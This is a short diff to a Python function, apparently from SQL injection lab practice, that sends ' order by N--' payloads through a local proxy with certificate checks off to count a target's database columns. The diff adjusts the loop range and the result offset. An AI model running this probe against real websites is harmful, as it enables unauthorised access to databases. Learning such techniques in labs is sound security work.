@@ -9,12 +9,12 @@ proxies = {'http':'http://127.0.0.1:8087', 'https':'http://127.0.0.1:8087'}
 def exploit_sqli(url, uri, payload):
     result = 0
     # columns = 'NULL'
-    for i in range(50):
+    for i in range(1,50):
         payload = f"' order by {i}--"
         # payload1 = f"' UNION SELECT {columns}--"
         res = requests.get(url+uri+payload, proxies=proxies, verify=False)
         if res.status_code == 500 :
-            result = i
+            result = i-1
         # columns += ',NULL'
         
     return result
